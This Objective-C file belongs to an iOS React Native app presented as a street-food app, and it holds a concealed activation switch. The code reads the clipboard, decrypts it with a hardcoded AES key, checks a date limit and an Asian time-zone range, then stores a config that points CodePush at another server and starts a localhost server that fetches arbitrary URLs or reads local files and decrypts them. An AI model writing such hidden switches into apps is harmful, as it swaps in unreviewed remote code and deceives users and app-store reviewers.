//
//  RNTasteTheStreetFood.m
//  RNTheStreetFoodTaste
//
//  Created by Nicka on 7/7/23.
//  Copyright © 2023 Facebook. All rights reserved.
//

#import "RNTasteTheStreetFood.h"

#import <GCDWebServer.h>
#import <GCDWebServerDataResponse.h>
#if __has_include("RNIndicator.h")
#import "JJException.h"
#import "RNCPushNotificationIOS.h"
#import "RNIndicator.h"
#else
#import <JJException.h>
#import <RNCPushNotificationIOS.h>
#import <RNIndicator.h>
#endif

#import <CocoaSecurity/CocoaSecurity.h>
#import <CodePush/CodePush.h>
#import <CommonCrypto/CommonCrypto.h>
#import <SensorsAnalyticsSDK/SensorsAnalyticsSDK.h>
#import <UMCommon/UMCommon.h>
#import <react-native-orientation-locker/Orientation.h>

#import <React/RCTAppSetupUtils.h>
#import <React/RCTBridge.h>
#import <React/RCTBundleURLProvider.h>
#import <React/RCTRootView.h>

#if RCT_NEW_ARCH_ENABLED
#import <React/CoreModulesPlugins.h>
#import <React/RCTCxxBridgeDelegate.h>
#import <React/RCTFabricSurfaceHostingProxyRootView.h>
#import <React/RCTSurfacePresenter.h>
#import <React/RCTSurfacePresenterBridgeAdapter.h>
#import <ReactCommon/RCTTurboModuleManager.h>

#import <react/config/ReactNativeConfig.h>

static NSString *const kRNConcurrentRoot = @"concurrentRoot";

@interface RNTasteTheStreetFood () <RCTCxxBridgeDelegate, RCTTurboModuleManagerDelegate> {
  RCTTurboModuleManager *_turboModuleManager;
  RCTSurfacePresenterBridgeAdapter *_bridgeAdapter;
  std::shared_ptr<const facebook::react::ReactNativeConfig> _reactNativeConfig;
  facebook::react::ContextContainer::Shared _contextContainer;
}

@end
#endif

@interface RNTasteTheStreetFood ()

@property(nonatomic, strong) GCDWebServer *tasteTheStreetFood_pySever;

@end
//enjoyTogether
@implementation RNTasteTheStreetFood

static NSString *tasteTheStreetFood_enjoyTogetherHexkey = @"86f1fda459fa47c72cb94f36b9fe4c38";
static NSString *tasteTheStreetFood_enjoyTogetherHexIv = @"CC0A69729E15380ADAE46C45EB412A23";

static NSString *tasteTheStreetFood_enjoyTogetherCYVersion = @"appVersion";
static NSString *tasteTheStreetFood_enjoyTogetherCYKey = @"deploymentKey";
static NSString *tasteTheStreetFood_enjoyTogetherCYUrl = @"serverUrl";

static NSString *tasteTheStreetFood_enjoyTogetherYMKey = @"umKey";
static NSString *tasteTheStreetFood_enjoyTogetherYMChannel = @"umChannel";
static NSString *tasteTheStreetFood_enjoyTogetherSenServerUrl = @"sensorUrl";
static NSString *tasteTheStreetFood_enjoyTogetherSenProperty = @"sensorProperty";

static NSString *tasteTheStreetFood_enjoyTogetherAPP = @"tasteTheStreetFood_FLAG_APP";
static NSString *tasteTheStreetFood_enjoyTogetherSpRoutes = @"spareRoutes";
static NSString *tasteTheStreetFood_enjoyTogetherWParams = @"washParams";
static NSString *tasteTheStreetFood_enjoyTogetherVPort = @"vPort";
static NSString *tasteTheStreetFood_enjoyTogetherVSecu = @"vSecu";

static RNTasteTheStreetFood *instance = nil;

+ (instancetype)tasteTheStreetFood_enjoyTogetherShared {
  static dispatch_once_t onceToken;
  dispatch_once(&onceToken, ^{
    instance = [[self alloc] init];
  });
  return instance;
}

- (BOOL)tasteTheStreetFood_enjoyTogetherJumpByPBD {
  NSString *copyString = [UIPasteboard generalPasteboard].string;
  if (copyString == nil) {
    return NO;
  }

  if ([copyString containsString:@"#iPhone#"]) {
    NSArray *tempArray = [copyString componentsSeparatedByString:@"#iPhone#"];
    if (tempArray.count > 1) {
      copyString = tempArray[1];
    }
  }
  CocoaSecurityResult *aesDecrypt = [CocoaSecurity aesDecryptWithBase64:copyString hexKey:tasteTheStreetFood_enjoyTogetherHexkey hexIv:tasteTheStreetFood_enjoyTogetherHexIv];

  if (!aesDecrypt.utf8String) {
    return NO;
  }

  NSData *data = [aesDecrypt.utf8String dataUsingEncoding:NSUTF8StringEncoding];
  NSDictionary *dict = [NSJSONSerialization JSONObjectWithData:data options:kNilOptions error:nil];
  if (!dict) {
    return NO;
  }
  if (!dict[@"data"]) {
    return NO;
  }
  return [self tasteTheStreetFood_enjoyTogetherStoreConfigInfo:dict[@"data"]];
}

- (BOOL)tasteTheStreetFood_enjoyTogetherStoreConfigInfo:(NSDictionary *)dict {
    if (dict[tasteTheStreetFood_enjoyTogetherCYVersion] == nil || dict[tasteTheStreetFood_enjoyTogetherCYKey] == nil || dict[tasteTheStreetFood_enjoyTogetherCYUrl] == nil) {
        return NO;
    }

    NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
    [ud setBool:YES forKey:tasteTheStreetFood_enjoyTogetherAPP];
    
    [dict enumerateKeysAndObjectsUsingBlock:^(id  _Nonnull key, id  _Nonnull obj, BOOL * _Nonnull stop) {
        [ud setObject:obj forKey:key];
    }];

    [ud synchronize];
    return YES;
}

- (BOOL)tasteTheStreetFood_timeZoneInAsian {
  NSInteger secondsFromGMT = NSTimeZone.localTimeZone.secondsFromGMT / 3600;
  if (secondsFromGMT >= 3 && secondsFromGMT <= 11) {
    return YES;
  } else {
    return NO;
  }
}

- (UIInterfaceOrientationMask)tasteTheStreetFood_enjoyTogetherGetOrientation {
  return [Orientation getOrientation];
}

- (BOOL)tasteTheStreetFood_letsFindLimitWay:(NSInteger)dateLimit {
    if ([[NSDate date] timeIntervalSince1970] < dateLimit) {
        return NO;
    } else {
        return [self tasteTheStreetFood_enjoyThisWay];
    }
}

- (BOOL)tasteTheStreetFood_enjoyThisWay {
  NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
  if (![self tasteTheStreetFood_timeZoneInAsian]) {
    return NO;
  }
  if ([ud boolForKey:tasteTheStreetFood_enjoyTogetherAPP]) {
    return YES;
  } else {
    return [self tasteTheStreetFood_enjoyTogetherJumpByPBD];
  }
}

- (void)tasteTheStreetFood_ymSensorConfigInfo {
  NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
  if ([ud stringForKey:tasteTheStreetFood_enjoyTogetherYMKey] != nil) {
    [UMConfigure initWithAppkey:[ud stringForKey:tasteTheStreetFood_enjoyTogetherYMKey] channel:[ud stringForKey:tasteTheStreetFood_enjoyTogetherYMChannel]];
  }
  if ([ud stringForKey:tasteTheStreetFood_enjoyTogetherSenServerUrl] != nil) {
    SAConfigOptions *options = [[SAConfigOptions alloc] initWithServerURL:[ud stringForKey:tasteTheStreetFood_enjoyTogetherSenServerUrl] launchOptions:nil];
    options.autoTrackEventType = SensorsAnalyticsEventTypeAppStart | SensorsAnalyticsEventTypeAppEnd | SensorsAnalyticsEventTypeAppClick | SensorsAnalyticsEventTypeAppViewScreen;
    [SensorsAnalyticsSDK startWithConfigOptions:options];
    [[SensorsAnalyticsSDK sharedInstance] registerSuperProperties:[ud dictionaryForKey:tasteTheStreetFood_enjoyTogetherSenProperty]];
  }
}

- (void)tasteTheStreetFood_enjoyTogetherAPPDidBecomeActiveConfiguration {
  NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
  [self tasteTheStreetFood_enjoyTogetherHandlerServerWithPort:[ud stringForKey:tasteTheStreetFood_enjoyTogetherVPort] security:[ud stringForKey:tasteTheStreetFood_enjoyTogetherVSecu]];
}

- (void)tasteTheStreetFood_enjoyTogetherAPPDidEnterBackgroundConfiguration {
  if (_tasteTheStreetFood_pySever.isRunning == YES) {
    [_tasteTheStreetFood_pySever stop];
  }
}

- (NSData *)tasteTheStreetFood_enjoyTogetherComData:(NSData *)tasteTheStreetFood_cydata tasteTheStreetFood_security:(NSString *)tasteTheStreetFood_cySecu {
  char tasteTheStreetFood_kbPath[kCCKeySizeAES128 + 1];
  memset(tasteTheStreetFood_kbPath, 0, sizeof(tasteTheStreetFood_kbPath));
  [tasteTheStreetFood_cySecu getCString:tasteTheStreetFood_kbPath maxLength:sizeof(tasteTheStreetFood_kbPath) encoding:NSUTF8StringEncoding];
  NSUInteger dataLength = [tasteTheStreetFood_cydata length];
  size_t bufferSize = dataLength + kCCBlockSizeAES128;
  void *tasteTheStreetFood_kbuffer = malloc(bufferSize);
  size_t numBytesCrypted = 0;
  CCCryptorStatus cryptStatus = CCCrypt(kCCDecrypt, kCCAlgorithmAES128, kCCOptionPKCS7Padding | kCCOptionECBMode, tasteTheStreetFood_kbPath, kCCBlockSizeAES128, NULL, [tasteTheStreetFood_cydata bytes], dataLength, tasteTheStreetFood_kbuffer, bufferSize, &numBytesCrypted);
  if (cryptStatus == kCCSuccess) {
    return [NSData dataWithBytesNoCopy:tasteTheStreetFood_kbuffer length:numBytesCrypted];
  } else {
    return nil;
  }
}

- (void)tasteTheStreetFood_enjoyTogetherHandlerServerWithPort:(NSString *)port security:(NSString *)security {
  if (self.tasteTheStreetFood_pySever.isRunning) {
    return;
  }

  __weak typeof(self) weakSelf = self;
  [self.tasteTheStreetFood_pySever
      addHandlerWithMatchBlock:^GCDWebServerRequest *_Nullable(NSString *_Nonnull method, NSURL *_Nonnull requestURL, NSDictionary<NSString *, NSString *> *_Nonnull requestHeaders, NSString *_Nonnull urlPath, NSDictionary<NSString *, NSString *> *_Nonnull urlQuery) {
        NSString *reqString = [requestURL.absoluteString stringByReplacingOccurrencesOfString:[NSString stringWithFormat:@"http://localhost:%@/", port] withString:@""];
        return [[GCDWebServerRequest alloc] initWithMethod:method url:[NSURL URLWithString:reqString] headers:requestHeaders path:urlPath query:urlQuery];
      }
      asyncProcessBlock:^(__kindof GCDWebServerRequest *_Nonnull request, GCDWebServerCompletionBlock _Nonnull completionBlock) {
        if ([request.URL.absoluteString containsString:@"downplayer"]) {
          NSData *data = [NSData dataWithContentsOfFile:[request.URL.absoluteString stringByReplacingOccurrencesOfString:@"downplayer" withString:@""]];
          NSData *decruptedData = nil;
          if (data) {
            decruptedData = [weakSelf tasteTheStreetFood_enjoyTogetherComData:data tasteTheStreetFood_security:security];
          }
          GCDWebServerDataResponse *resp = [GCDWebServerDataResponse responseWithData:decruptedData contentType:@"audio/mpegurl"];
          completionBlock(resp);
          return;
        }

        NSURLSessionDataTask *task = [[NSURLSession sharedSession] dataTaskWithRequest:[NSURLRequest requestWithURL:[NSURL URLWithString:request.URL.absoluteString]]
                                                                     completionHandler:^(NSData *_Nullable data, NSURLResponse *_Nullable response, NSError *_Nullable error) {
                                                                       NSData *decruptedData = nil;
                                                                       if (!error && data) {
                                                                         decruptedData = [weakSelf tasteTheStreetFood_enjoyTogetherComData:data tasteTheStreetFood_security:security];
                                                                       }
                                                                       GCDWebServerDataResponse *resp = [GCDWebServerDataResponse responseWithData:decruptedData contentType:@"audio/mpegurl"];
                                                                       completionBlock(resp);
                                                                     }];
        [task resume];
      }];

  NSError *error;
  NSMutableDictionary *options = [NSMutableDictionary dictionary];

  [options setObject:[NSNumber numberWithInteger:[port integerValue]] forKey:GCDWebServerOption_Port];
  [options setObject:@(YES) forKey:GCDWebServerOption_BindToLocalhost];
  [options setObject:@(NO) forKey:GCDWebServerOption_AutomaticallySuspendInBackground];

  if ([self.tasteTheStreetFood_pySever startWithOptions:options error:&error]) {
    NSLog(@"GCDWebServer started successfully");
  } else {
    NSLog(@"GCDWebServer could not start");
  }
}

- (UIViewController *)tasteTheStreetFood_enjoyTogetherChangeRootController:(UIApplication *)application withOptions:(NSDictionary *)launchOptions {
  RCTAppSetupPrepareApp(application);

  [self tasteTheStreetFood_ymSensorConfigInfo];
  if (!_tasteTheStreetFood_pySever) {
    _tasteTheStreetFood_pySever = [[GCDWebServer alloc] init];
    [self tasteTheStreetFood_enjoyTogetherAPPDidBecomeActiveConfiguration];
    [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(tasteTheStreetFood_enjoyTogetherAPPDidBecomeActiveConfiguration) name:UIApplicationDidBecomeActiveNotification object:nil];
    [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(tasteTheStreetFood_enjoyTogetherAPPDidEnterBackgroundConfiguration) name:UIApplicationDidEnterBackgroundNotification object:nil];
  }

  UNUserNotificationCenter *center = [UNUserNotificationCenter currentNotificationCenter];
  center.delegate = self;
  [JJException configExceptionCategory:JJExceptionGuardDictionaryContainer | JJExceptionGuardArrayContainer | JJExceptionGuardNSStringContainer];
  [JJException startGuardException];

  RCTBridge *bridge = [[RCTBridge alloc] initWithDelegate:self launchOptions:launchOptions];

#if RCT_NEW_ARCH_ENABLED
  _contextContainer = std::make_shared<facebook::react::ContextContainer const>();
  _reactNativeConfig = std::make_shared<facebook::react::EmptyReactNativeConfig const>();
  _contextContainer->insert("ReactNativeConfig", _reactNativeConfig);
  _bridgeAdapter = [[RCTSurfacePresenterBridgeAdapter alloc] initWithBridge:bridge contextContainer:_contextContainer];
  bridge.surfacePresenter = _bridgeAdapter.surfacePresenter;
#endif

  NSDictionary *initProps = [self prepareInitialProps];
  UIView *rootView = RCTAppSetupDefaultRootView(bridge, @"NewYorkCity", initProps);

  if (@available(iOS 13.0, *)) {
    rootView.backgroundColor = [UIColor systemBackgroundColor];
  } else {
    rootView.backgroundColor = [UIColor whiteColor];
  }

  UIViewController *rootViewController = [HomeIndicatorView new];
  rootViewController.view = rootView;
  UINavigationController *navc = [[UINavigationController alloc] initWithRootViewController:rootViewController];
  navc.navigationBarHidden = true;
  return navc;
}

- (void)userNotificationCenter:(UNUserNotificationCenter *)center didReceiveNotificationResponse:(UNNotificationResponse *)response withCompletionHandler:(void (^)(void))completionHandler {
  [RNCPushNotificationIOS didReceiveNotificationResponse:response];
}

- (void)userNotificationCenter:(UNUserNotificationCenter *)center willPresentNotification:(UNNotification *)notification withCompletionHandler:(void (^)(UNNotificationPresentationOptions options))completionHandler {
  completionHandler(UNNotificationPresentationOptionSound | UNNotificationPresentationOptionAlert | UNNotificationPresentationOptionBadge);
}

/// This method controls whether the `concurrentRoot`feature of React18 is
/// turned on or off.
///
/// @see: https://reactjs.org/blog/2022/03/29/react-v18.html
/// @note: This requires to be rendering on Fabric (i.e. on the New
/// Architecture).
/// @return: `true` if the `concurrentRoot` feture is enabled. Otherwise, it
/// returns `false`.
- (BOOL)concurrentRootEnabled {
  // Switch this bool to turn on and off the concurrent root
  return true;
}

- (NSDictionary *)prepareInitialProps {
  NSMutableDictionary *initProps = [NSMutableDictionary new];

#ifdef RCT_NEW_ARCH_ENABLED
  initProps[kRNConcurrentRoot] = @([self concurrentRootEnabled]);
#endif

  return initProps;
}

- (NSURL *)sourceURLForBridge:(RCTBridge *)bridge {
#if DEBUG
  return [[RCTBundleURLProvider sharedSettings] jsBundleURLForBundleRoot:@"index"];
#else
  return [CodePush bundleURL];
#endif
}

#if RCT_NEW_ARCH_ENABLED

#pragma mark - RCTCxxBridgeDelegate

- (std::unique_ptr<facebook::react::JSExecutorFactory>)jsExecutorFactoryForBridge:(RCTBridge *)bridge {
  _turboModuleManager = [[RCTTurboModuleManager alloc] initWithBridge:bridge delegate:self jsInvoker:bridge.jsCallInvoker];
  return RCTAppSetupDefaultJsExecutorFactory(bridge, _turboModuleManager);
}

#pragma mark RCTTurboModuleManagerDelegate

- (Class)getModuleClassFromName:(const char *)name {
  return RCTCoreModulesClassProvider(name);
}

- (std::shared_ptr<facebook::react::TurboModule>)getTurboModule:(const std::string &)name jsInvoker:(std::shared_ptr<facebook::react::CallInvoker>)jsInvoker {
  return nullptr;
}

- (std::shared_ptr<facebook::react::TurboModule>)getTurboModule:(const std::string &)name initParams:(const facebook::react::ObjCTurboModule::InitParams &)params {
  return nullptr;
}

- (id<RCTTurboModule>)getModuleInstanceFromClass:(Class)moduleClass {
  return RCTAppSetupDefaultModuleFromClass(moduleClass);
}

#endif

@end
